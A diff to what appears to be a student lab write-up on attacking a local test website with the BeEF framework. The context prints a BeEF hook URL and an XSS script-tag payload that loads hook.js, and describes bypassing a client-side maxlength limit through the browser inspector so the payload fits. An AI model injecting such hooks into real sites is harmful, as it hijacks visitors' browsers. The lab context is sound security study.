@@ -126,7 +126,8 @@ To prepare Replicants website, I navigated to Vagrant, ran command: `~/Documents
 ```
 BeEF hook: http://127.0.0.1:3000/hook.js
 Playload: <script src="http://127.0.0.1:3000/hook.js"></script>
-'''
+```
+
 I injected this payload and an issue that was found was there is only a max length= "50" in orginal source code, therefore we can not input the whole payload code, so by right-clicking on the web page and selecting "inspecting the element". Chaged the maxlength="100".
 
 <p>
